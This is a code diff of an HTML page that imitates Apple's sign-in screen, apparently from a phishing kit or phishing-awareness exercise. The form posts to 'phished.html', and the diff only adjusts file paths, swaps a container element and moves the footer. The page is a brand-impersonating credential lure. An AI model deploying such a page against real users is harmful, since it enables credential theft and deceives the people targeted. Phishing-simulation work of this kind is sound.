@@ -9,10 +9,10 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
     <meta name="description" id="description" content="Sign in with Apple account" />
 
-    <link href="/favicon.ico" rel="shortcut icon" type="image/x-icon" />
+    <link href="favicon.ico" rel="shortcut icon" type="image/x-icon" />
     <link href="//fonts.googleapis.com/css?family=PT+Sans+Narrow:400&display=swap" rel="stylesheet" />
-    <link href="css/reset.css" rel="stylesheet" />
-    <link href="css/apple.css" rel="stylesheet" />
+    <link href="../reset.css" rel="stylesheet" />
+    <link href="apple.css" rel="stylesheet" />
 
   </head>
   <body tabindex="0">
@@ -21,14 +21,14 @@
     <section class="apple-wrap">
 
       <!-- form center container -->
-      <div class="apple-container">
+      <main class="apple-container">
 
         <!-- form object -->
-        <form class="apple-form" action="phished.html" method="POST" autocomplete="off">
+        <form class="apple-form" action="../phished.html" method="POST" autocomplete="off">
 
           <!-- form logo -->
           <div class="apple-logo">
-            <img src="img/apple-logo.png" alt="Apple" />
+            <img src="apple-logo.png" alt="Apple" />
           </div>
 
           <!-- default heading -->
@@ -55,23 +55,23 @@
 
         </form>
 
-      </div>
+      </main>
+
+      <!-- form footer links -->
+      <footer class="apple-footer">
+        <a href="#">Check Activation Lock Status</a>
+        <a href="#">Forgot ID or Password?</a>
+        <a href="#">System Status</a>
+        <a href="#">Privacy Policy</a>
+        <a href="#">Terms and Conditions</a>
+        <a href="#">Copyright © 2019 Apple Inc. All rights reserved.</a>
+      </footer>
 
     </section>
 
-    <!-- form footer links -->
-    <footer class="apple-footer">
-      <a href="#">Check Activation Lock Status</a>
-      <a href="#">Forgot ID or Password?</a>
-      <a href="#">System Status</a>
-      <a href="#">Privacy Policy</a>
-      <a href="#">Terms and Conditions</a>
-      <a href="#">Copyright © 2019 Apple Inc. All rights reserved.</a>
-    </footer>
-
     <!-- form scripts -->
     <script src="//code.jquery.com/jquery-3.4.0.slim.min.js"></script>
-    <script src="js/apple.js"></script>
+    <script src="apple.js"></script>
 
   </body>
 </html>
